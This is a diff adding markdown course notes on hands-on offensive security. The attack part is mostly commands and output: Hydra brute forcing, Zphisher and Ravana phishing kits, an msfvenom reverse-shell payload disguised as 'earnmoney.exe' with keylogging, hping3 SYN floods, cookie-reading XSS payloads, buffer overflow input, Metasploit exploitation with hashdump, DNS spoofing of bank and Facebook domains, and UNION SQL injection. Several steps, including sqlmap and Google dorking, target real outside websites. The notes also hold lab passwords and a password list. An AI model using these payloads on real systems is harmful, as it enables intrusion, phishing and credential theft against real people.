@@ -1,0 +1,801 @@
+# Practical - Security Concepts
+
+# Linux - Kali Linux / Ubuntu
+
+## HYDRA - Brute Force Tool
+
+- Running services like ssh and ftp ---> If these port are open
+- How to connect one vm kali linux to vm debian by ssh
+
+- Create a 5 user and their password --> in debian
+- ex: user1 , user2 , user3 , user4 , user5
+- ex: password --> admin@123 , admin@1234 , .....
+
+- Now in Kali Linux (Attacker Machine)
+
+  - users.txt
+  - password.txt
+    --> $ sudo -s
+    ---> $ ls
+    --> root user
+    --> # hydra -L users.txt -P password.txt 192.168.100.-- ssh
+    - We will get users and password matching list --> Finished --> Successfully completed , ex: 3 valid passwords found ...
+
+- Download the Dictionary from GitHub for Username and Password
+- Type " Wordlists " on GitHub
+- Type " Download Password "
+- Type " Download rock you txt "
+
+- Linux --> cd /usr/share/dic OR cd /usr/share/dictionaries-common
+
+---
+
+## Task --> Linux --> Tool --> cupp
+
+- $ cd
+- $ sudo apt install cupp
+- $ cupp -i
+- $ sudo systemctl restart ftp
+- $ Download the rock you.txt --> In Kali Linux
+- $ cat rockyou.txt
+
+---
+
+## Phishing Attack
+
+- cd /var/www/html
+- pwd
+- rm index.html
+- nano index.html
+  - Facebook Source Code (inspect)
+- systemctl restart apache2.service
+  - Open any browser --> type :- localhost / 127.0.0.0 / IP address
+    - loopback address --> There's no place like 127.0.0.0 --> It is a special IP address used by a computer to communicate with itself, also known as localhost.
+
+## Tool --> Zphisher OR Ravana
+
+--> Download from GitHub --> Ravana
+
+- ls
+- git clone https://github.com/princekrvert/Ravana.git
+- cd Ravana
+- ./ravana.sh
+  - Choose an optio: 2
+  - Start localhost
+  - Random : 1
+  - http://127.0.0.1:8874
+- Instagram Ussername: john Pass: john@123
+
+---> Short URL --> Website : https://www.shorturl.at/
+---> Short URL --> Website : https://bitly.com/
+
+--> Download from GitHub --> Zphisher
+
+- ls
+- git clone https://github.com/htr-tech/zphisher.git
+- cd zphisher
+- ls
+- ./zphisher.sh
+
+---
+
+## How to create Payload for window
+
+--> Download --> Tool --> winscp --> To copy and paste from Windows Machine to Linux Terminal and viceversa
+
+- Open winscp --> Give Hostname as IP (Linux)
+- Restart the service of ssh in Linux
+
+  - systemctl restart ssh.service
+
+- $ msfvenom -p windows /metetpreter/reverse_tcp LHOST = 192.168.1.100 LPORT = 4444 -f exe > earnmoney.exe
+
+- Copy and paste the file from linux to windows
+- Run the command in Linux
+  - $ mfsconsole
+    - msf6 > use multi/handler
+    - set payload windows/meterpreter/reverse_tcp
+    - set LHOST 192.168.1.152
+    - set LPORT 4444
+    - exploit
+    - meterpreter > help
+    - keyscan_start
+      - to start the scanning of keystrokes
+      - Now search in windows something like websites --> google.com , instagram.com , etc
+    - keyscan_dump > one.txt
+    - keyscan_stop
+      - to stop the scanning of keystrokes
+    - meterpreter > shell ---> now it will show the shell of windows
+
+###########################################################
+
+## DOS Attack - Denial of Services
+
+- DOS Attack
+  - Flooding
+    - ICMP
+    - ACK
+    - SYN
+- DOS Attack --> Command Linux "hping"
+
+### Linux Command
+
+- hping3 --flood -S -V --rand-source 192.168.1.1
+- hping3 -d 65495 -syn --flood 192.168.1.1
+
+- There is a file
+  - /proc/sys/net/ipv4/icmp_echo_ignore_all
+  - change the value from 0 --> to --> 1
+  - It will block the file ICMP package
+
+#######################################################################
+
+## Software / Tool --> Burp Suite - Open it in Kali Linux
+
+### Proxy Settings (Kali Linux)
+
+- Open any Browser
+
+  - Settings --> Connection Settings --> Configure Proxy Access to be Internet --> 127.0.0.1 --> Port : 8080 --> Tick on HTTPS --> Done --> Restart the Browser
+
+- Burp Suite --> Proxy --> Intercept --> ON
+
+- Now Open Burp Suite --> See the Result
+
+- We can Add new target scope --> Burp Suite --> Give particular website URL ex : www.compshiksha.com , http://testphp.vulnweb.com , http://demo.testfire.net
+
+- Burp Suite --> Tab Proxy --> Intercept OFF
+
+- Open Firefox --> Sign Up --> Give Username and Password --> See the Result in Burp Suite -->
+
+- Now Intercept ON --> Click on SignUp Button and See the Result , you will see or get the username and password
+
+- Reference Link : https://medium.com/@uhabiba503/a-step-by-step-guide-to-using-burpsuite-for-web-application-security-testing-da9fae620270
+
+######################################################################
+
+# DAMN VULNERABLE WEB APPLICATION [DVWA]
+
+- DVWA is a PHP/MariaDB web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to aid both students & teachers to learn about web application security in a controlled class room environment.
+
+##### GitHub --> https://github.com/digininja/DVWA
+
+- make root --> $ sudo -s
+- $ apt update
+- $ apt install -y apache2 mariadb-server mariadb-client php php-mysqli php-gd libapache2-mod-php
+
+- $ cd var/www/html/
+- Kali Linux --> Git Clone the GitHub Repo
+- $ git clone https://github.com/digininja/DVWA.git
+- $ cd var/www/html/dvwa --> This will show
+
+- $ cp config/config.inc.php.dist config/config.inc.php
+
+- $ nano config.inc.php
+
+  - $\_DVWA[ 'db_server'] = '127.0.0.1';
+  - $\_DVWA[ 'db_port'] = '3306';
+  - $\_DVWA[ 'db_user' ] = 'admin';
+  - $\_DVWA[ 'db_password' ] = 'admin@123';
+  - $\_DVWA[ 'db_database' ] = 'dvwa';
+
+- $ systemctl restart mariadb.service
+- $ mariadb -u root / mysql -u root -p
+- $ create database dvwa ;
+- $ create user admin@localhost identified by 'admin@123';
+- $ grant all on dvwa.\* to admin@localhost;
+- OR - $ grant all privileges on dvwa.\* to admin@localhost;
+- $ flush privileges;
+- exit;
+
+- root@kali - /var/www/html/DVWA
+- $ chmod -R 777 /var/www/html/DVWA
+- $ systemctl restart mariadb.service / restart mysql
+- $ systemctl restart apache2.service
+
+- Open Browser and type localhost/DVWA/index.php --> and see the result and give username - admin " admin " and password - " password "
+
+- Click on at last of page --> reset and create database
+- And then Login again --> We will see the DVWA page / Dashboard
+
+---
+
+## DVWA (Damn Vulnerable Web Application)
+
+- DVWA Security Level : Low
+
+#### Cross Site Scripting (XSS)
+
+    - Reflected XSS
+    - Stored Based XSS
+    - DOM Based XSS
+
+- Reflected Based XSS
+
+  - Data is not stored on server
+  - Script is running at client side
+
+- XSS (Reflected) --> Kali Linux Setup of DVWA
+- Low Level Security
+  - Hello
+  - <h1> Hello </h1>
+  - <script>alert("hello")</script>
+  - Generate a Weak Session IDs
+  - <script>alert(document.cookie)</script>
+- Medium Level Security
+  - <script>alert(document.cookie)</script>  --> ERROR
+  - <scr<script>ipt>alert("Hello")</script>
+  - Generate a Weak Session IDs
+  - <scr<script>ipt>alert(document.cookie)</script>
+- High Level Security
+  - <img src=x onMouseOver=alert ("hello")>
+
+---
+
+- Stored
+
+  - Stored and executed on server
+  - Executed every time
+
+- Go in Kali Linux Browser --> Open DVWA
+- Click on XSS (Stored)
+  - Inspect it and check the maxlength and change it to 100
+  - and see the result or type in Name: Box
+
+---
+
+- DOM
+  - Low Level Security
+    - Select Language - Click on Select Button
+    - See the URL like ex: (127.0.0.1/DVWA/vulnerabilities/xss_d?/?default --> after default=English
+    - Replace English as --> <script>alert(1)</script>
+
+#################################################################33
+
+## Wireshark --> Monitoring tool
+
+- capture and display the packets
+
+- Search on Google Dorks --> Exploit Database --> search http login --> Login it by username and password any website
+
+- Search in Wireshark --> about Credanatials
+
+---
+
+## SQL Injection
+
+- Open Google Dork --> search for php id site: pk
+- Site : https://www.exploit-db.com/google-hacking-database
+- Ex: inurl:php?id=1 site:com
+- Ex : $ sqlmap -u https://www.hotelone.com.pk/article.php?d=15
+
+---
+
+##############################################################
+
+### Practical (IP Spoofing)
+
+- sudo -i
+- nmap 192.168.1.100 --> Router Address
+- nmap -D RND:10 -p 100-500 192.168.1.100
+- nmap -D RND:5 192.168.1.100
+- nmap -D "1.1.1.1" "192.168.1.1"
+
+##########################################################3
+
+# Tool --> Nessus
+
+- Nessus is a platform developed by Tenable that scans for security vulnerabilities in devices, applications, operating systems, cloud services and other network resources.
+- Port No : 8834
+- Installation : https://gist.github.com/greenmind-sec/6fdb1e785d828bccfdc529b50134dd6f
+- Installation : https://gist.github.com/deargle/d4dc4ea5a877ea13723d8e8ef9c11b08
+- Reference Link : https://github.com/Ebryx/Nessus_Map
+- Practical Link : https://koayyongcett.medium.com/introduction-to-nessus-and-hands-on-practice-to-scan-the-network-34c8048090fc
+
+### Install Tenable Nessus on Linux -->
+
+- $ curl --request GET \
+  --url 'https://www.tenable.com/downloads/api/v2/pages/nessus/files/Nessus-10.8.4-debian10_amd64.deb' \
+  --output 'Nessus-10.8.4-debian10_amd64.deb'
+- $ dpkg -i Nessus-10.8.4-debian10_amd64.deb
+
+--> https://docs.tenable.com/nessus/Content/InstallNessusLinux.htm#Download-the-Tenable-Nessus-package-file.
+
+--> https://koayyongcett.medium.com/introduction-to-nessus-and-hands-on-practice-to-scan-the-network-34c8048090fc
+
+- cd Downloads
+- ls
+- sudo su root
+- dpkg -i Nessus-<Version>-debian6_amd64.deb
+- service nessusd status
+- netstat --tnlp
+- service nessusd restart
+- service nessused status
+  - Running
+- Now open Browser : https://locslhot:8834
+
+---
+
+########################################################################3
+
+## Buffer Overflow --> Practical
+
+- $ gdb ./name of file --> Linux
+- $ (gdb) > info functions
+- $ disassemble main
+- $ disassemble ctf ( ctf --> calling functions )
+  - note down ctf ID / address
+- $ info functions
+- $ info registers
+- $ run
+  - give password
+- $ info reg
+- $ exit
+
+- ./ctf
+  - Enter a password : length 12 (AAAA--)
+- $ python2.7 -c 'print("A"\*30)' > buff.txt
+  - cat buff.txt
+- $ ./ctf < buff.txt
+  - Enter password :
+    - Segmentation Error
+- $ gdb ./ctf
+- $ (gdb) - run < buff.txt
+
+- Reverse Shell --> It is also known as a remote shell or “connect-back shell,” takes advantage of the target system's vulnerabilities to initiate a shell session.
+
+- IMP Interview :
+- What is Reverse Shell , why we used ??
+
+---
+
+## Practical (Buffer Overflow)
+
+- Download the GitHub file from Browser below
+- https://github.com/sandeepw1/securityconcepts.git
+
+- $ ls
+- $ unzip filename
+  - buff-lab2 password : password
+- $ sudo apt install gdb -y
+
+- $ gdb ./buff-lab2
+- $ info functions
+  - Note down the address of ctf1 / ctf2 / ctf3
+  - 0x08049268 ctf1
+  - 0x08049291 ctf2
+  - 0x080492ba ctf3
+- $ disassemble main
+- $ exit
+
+- $ python2 -c 'print "A"\*30' > attack.txt
+
+- $ cat attack.txt
+
+- $ sudo ./buff-lab2 < attack.txt
+
+  - Enter your password:
+  - Sorry Wrong Password!...Try Again!
+  - Error : Segmentation Fault
+
+- $ sudo gdb ./buff-lab2
+- $ run < attack.txt
+- $ exit
+
+- $ python2 -c 'print ("A"\*28 + "\xba\x92\x04\x08")' > attack.txt
+- $ sudo ./buff-lab2 < attack.txt
+- $ cat attack.txt
+- $ sudo gdb ./buff-lab2
+- $ run < attack.txt
+  - The flag is..W3ll D0n3.. 8uff3r0verfl0w
+- $ exit
+
+#####################################################################
+
+#### Kali Linux - Practical
+
+- sudo nmap -sS <IP> --> SYN Scan
+- sudo nmap -sA <IP> --> ACK Scan
+- sudo nmap <IP> --> SYN Packet / Default Scan
+- And then check the Wireshark
+
+#####################################################################
+
+### PING scanning options --> Practical
+
+### Kali Linux
+
+- $ sudo netdiscover -i eth0
+- $ ping -c3 <IP>
+  - see for nbns protocol for windows machine
+- $ nmap -sS <IP>
+  - If we get any port opening suppose 8080
+- Open Browser <IP : 8080>
+
+- $ ftp <IP> 192.168.80.154
+
+  - Name : anonymous
+  - Password : ---
+
+- $ nmap -O -Pn <IP> 192.168.80.154
+
+- $ nmap -sV -Pn <IP> 192.168.80.154
+
+- $ searchsploit Apache httpd 2.4.58
+- $ searchsploit httpfileserver
+- ##Open new terminal
+- $ sudo msfconsole
+- $ search httpfileserver
+- $ use 0
+- $ search payloads
+- $ set payload windows/shell/reverse_tcp
+- $ show options
+- $ set RHOSTS 192.168.80.154
+
+- $ set LPORT 443
+- $ run
+- Microsoft Windows [Version 10.0.17763.253]
+
+---
+
+- C:\Webserver>whoami
+- whoami
+- dcserver\jack
+
+- user hack1 /add
+- exit
+
+- ##Again show payloads find out the meterpreter
+- $ show payloads
+- $ set payload windows/meterpreter/reverse_tcp
+- $ show options
+- $ run
+- meterpreter > help
+- meterpreter > hashdump
+  [-] priv_passwd_get_sam_hashes: Operation failed: 1168
+- meterpreter > ps
+  - Process List
+- migrate 952 (dwm.exe)
+- migrate 820 (svchost.exe)
+- migrate 2404 (conhost.exe)
+
+- exit
+
+###################################################
+
+- #### Password Guessing - Hydra Tool
+- $ cd /usr/share/wordlists
+- $ ls
+- $ sudo gunzip rockyou.txt.gz
+
+- $ hydra -h
+- Examples:
+
+  - hydra -l user -P passlist.txt ftp://192.168.0.1
+  - hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
+  - hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
+  - hydra -l admin -p password ftp://[192.168.0.0/24]/
+  - hydra -L logins.txt -P pws.txt -M targets.txt ssh
+
+- $ hydra -l jack -P rockyou.txt ftp://192/168.80.154
+
+- Ctrl+C (exit)
+- $ hydra -R (resume the session)
+
+- $ sudo hydra -l sam -P rockyou.txt ftp://192.168.80.154
+
+- $ sudo hydra -l administrator -P rockyou.txt ftp://192.168.80.154
+
+- Ctrl+c (exit)
+
+- $ sudo msfconsole
+- $ search httpfileserver
+- $ use 0
+- $ show options
+- $ set RHOSTS 192.168.80.154
+- $ set LHOST 192.168.80.133
+- $ set LPORT 4443
+- $ run
+
+- C:\inetpub\ftproot
+
+- cd ..
+- cd
+- cd web2
+- type index.html
+- dir
+- cd admin
+- type admin.html
+- type settings.html
+
+- download c:/inetpub/ftproot/admin-pass.txt
+
+- sudo hydra -l administrator -P admin-pass.txt 192.168.80.154 smb
+
+- search httpfileserver
+- use 0
+- set RHOSTS 192.168.80.154
+- set LHOST 192.168.80.133
+- set LPORT 443
+- exploit / run
+
+- shell
+- ls
+- cd \
+- md test1
+- ls
+
+- Windows Hacking Lab
+
+  - Username : Administartor
+  - Password : Iacsd@2025
+
+  - Username : sam
+  - Password : P@ssword
+
+  - Username : jack
+  - Password : Admin@123
+
+admin-pass.txt
+
+- Sunbeam@123
+  Acts@123
+  Sunbeam@2022
+  Iacsd@2022
+  Acts@2023
+  Iacsd@2023
+  Sunbeam@2025
+  Acts@2025
+  Iacsd@2025
+  iaCsd@2025
+  sunBeam@2025
+  Admin@2022
+  Admin@2023
+  Iacsd#2024
+  Iacsd@2020
+
+- Search - Free Password Hash Cracker [ https://crackstation.net/ ]
+
+- $ whoami
+  - Administartor
+- $ ps
+- $ migrate 4630 [dns.exe]
+- $ hashdump
+
+#########################################################
+
+## John the Ripper --> Practical
+
+- Download the passwd and shadow file from GitHub
+- Link : https://github.com/sandeepw1/securityconcepts
+
+- $ ls
+
+  - It will show 4 files like passwd , shadow , passwd1 shadow1
+
+- $ sudo unshadow passwd shadow > hashed-pass.txt
+
+- $ sudo john --wordlist=/usr/share/wordlists/rockyou.txt hashed-pass.txt
+
+- $ sudo unshadow passwd1 shadow1 > hashed-password1.txt
+
+- $ sudo john --wordlist=/usr/share/wordlists/rockyou.txt hashed-password1.txt [wordlist mode]
+
+- $ sudo john hased-password1.txt [single mode]
+
+---
+
+## ARP Poisoing
+
+## DNS Poisoing
+
+- Tool : ethercap --> For Man-in-the-middle attack
+
+### Practical
+
+##### Windows
+
+- Open CMD
+- $ ipconfig /all
+- $ arp -a
+
+##### Kali Linux
+
+- $ ls
+- $ sudo ettercap -G
+
+##### DNS Spoofing
+
+- $ sudo find / -name ettercap.dns
+
+##### Windows
+
+- $ arp -a
+
+##### Kali Linux
+
+- $ cd /etc/ettercap
+- $ ls
+- $ nslookup www.cdac.in
+- $ sudo nano etter.dns
+
+  - www.facebook.com A 196.1.1.172
+  - www.hdfcbank.com A 196.1.1.172
+  - 196.1.1.172 PTR www.facebook.com
+  - www.micromax.in A 196.1.1.172
+
+- $ sudo ettercap -G
+- Do practical implementation on Ettercap
+- Select Hosts --> Scan all hosts
+- Add IP Address to Target1 and Target2
+- Add Plugins --> Manage Plugins --> Add dns_spoof
+
+##### Windows
+
+- nslookup www.facebook.com
+- Search on browser above both site - IP Address will change
+
+##################################################################
+
+## Password Cracker methods
+
+- Dictonary Attack
+- Brute Force Attack
+- Rainbow Table Attack
+
+## Practical
+
+- netdiscover --> uses ARP Protocol
+
+- $ sudo netdiscover -i eth0
+- $ sudo nmap <Victim IP>
+- $ dirb http://192.168.80.154 --> [Wordlisr_files]
+- $ dirb http://192.168.80.154:9100
+- Open Browser
+
+  - <IP>:8100
+  - <IP>:9100/admin
+  - <IP>:9100/products
+  - <IP>:9100/admin/settings.html
+  - <IP>:9100/admin/admin/html
+
+- $ dirb http://192.168.80.154:9100
+- $ dirb http://192.168.80.154:8080
+
+#### Open Windows Machine in VM
+
+- Search for --> localhost:8080/phpmyadmin/
+- Create a Database --> ditiss
+- Create a new table --> students --> no.of columns --> 5
+- Column names -->
+
+  - 1] student_name --> varchar --> 50 --> tick null index
+  - 2] username --> varchar --> 50 --> tick null index
+  - 3] password --> varchar --> 50 --> tick null index
+  - 4] email --> varchar --> 50 --> tick null index
+  - 5] mobile --> varchar --> 10 --> tick null index
+
+- Create a column --> student_name , username , password , email , mobile
+- Insert any 5 data in database ditiss
+- select \* from students where username="tom" and password="P@ssword";
+- Try different types of select method by your own
+
+- select \* from students where username="tom" and password="1=1";
+
+- SELECT \* FROM `students` WHERE username='tom' and '1'='1'# password=' '; --> only particular username
+
+- SELECT \* FROM `students` WHERE username='user1' or '1'='1'# password=' '; --> All data table will be shown
+
+- Search on browser : [ inurl: php id= ]
+- Click on any site and at last URL just enter single apostrophe ( ' )
+
+- SELECT student_name , email , mobile FROM `students` WHERE username='tom';
+
+- SQL --> UNION and SELECT
+
+  - SQL UNION is a set operation that combines the result sets of two or more SELECT queries into a single result set.
+
+- SELECT student_name , email , mobile FROM `students` WHERE username='tom' union select 1,2,3; --> we can increase the number based on column mention
+
+- SELECT student_name , email , mobile FROM `students` WHERE username='tom' union select 1,version(),3; --> it will show the version of particular database like [ 10.4.32-MariaDB ]
+
+- SELECT student_name , email , mobile FROM `students` WHERE username='tom' union select 1 , TABLE_NAME , 3 from information_schema.tables;
+
+  - Retrieve a list of tables in the database alongside specific student details (e.g., for debugging, exploration, or testing purposes).
+  - Sometimes such queries can be used for SQL injection testing, where an attacker might try to manipulate the query to return unauthorized data.
+
+- SELECT student_name , email , mobile FROM `students` WHERE username='tom' union select 1 , column_name , 3 from information_schema.columns where TABLE_NAME='students';
+
+- SELECT student_name , email , mobile FROM `students` WHERE username='tom' union select username , password , null from students;
+
+- OR
+
+- SELECT student_name , email , mobile FROM `students` WHERE username='a' union select username , password , null from students;
+
+- ###To find out the database name
+
+- SELECT student_name , email , mobile FROM `students` WHERE username='a' union select NULL, SCHEMA_NAME , NULL from information_schema.schemata;
+
+---
+
+## SQL Injection --> Types of SQL Injection
+
+![4d38889eea8225a1baaff184a4b34e26.png](:/02002a693ee642eb9d745574ba67ec12)
+
+- Refernce Link : https://www.imperva.com/learn/application-security/sql-injection-sqli/
+
+## Damn Vulnerable Web Application (DVWA)
+
+- search windows given by sir in VM ware --> [ localhost:8080/dvwa ]
+
+- Reference Link : https://cspanias.github.io/posts/DVWA-SQL-Injection/
+
+- Reference Link : https://medium.com/@waeloueslati18/exploring-dvwa-a-walkthrough-of-the-sql-injection-challenge-part-7-7ada1ae784f2
+
+- Try SQL Injection
+- User ID :
+- '
+- '1' = '1'
+- 1' OR '1'='1'#
+- 1' union select 1,2#
+- 1' union select 1,version()#
+  - Surname: 10.4.32-MariaDB
+- a' union select 1,database()#
+  - Surname: dvwa
+- a' union select 1,user()#
+
+  - Surname: dvwa@localhost
+
+- Next, we’ll retrieve and display the columns of the users table by using the query :
+
+- 1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users' #
+
+- We can also access the usernames along with their encrypted passwords.
+
+- 1' UNION SELECT user, password FROM users #
+
+- OR
+
+- a' union select user , password from users#
+
+  - First name: admin
+  - Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+
+- Check the above password that are in hash , so convert it into regular text ..
+- Use : crakstation.net
+
+---
+
+- select id,first_name , last_name from some_table where id = '1' or '1'='1'#;
+- table_name from information_schema.tables
+- column_name from information_schema.columns
+- where table_name='user'
+
+---
+
+- Type 192.168.80.154:8080/dvwa from kali linux
+
+- Now use DVWA --> SQL Injection (Blind)
+- a' union select 1,2#
+- a' union select 1,2,3#
+
+- Use Burp Suite in Kali Linux
+
+- Use Kali Linux Terminal
+- ~/.local
+- $ sqlmap --url="https://192.168.80.154:8080/dvwa/vulnerabilities/----" -H "cookie: PHP----" -p id --dbs
+
+- Stored Procedure Example
+- DELIMITER //
+- //
+- CREATE PROCEDURE usr_Login4(name VARCHAR(50) , Pass VARCHAR(50)) BEGIN SELECT \* FROM students where username = name and password = pass;
+- END //
+- DELIMITER ;
+
+- call usr_Login4('sam' , 'P@ssword');
+
+- call usr_Login4('sam' or '1' = '1' , 'P@ssword');
+
+---
+
+###############################################################
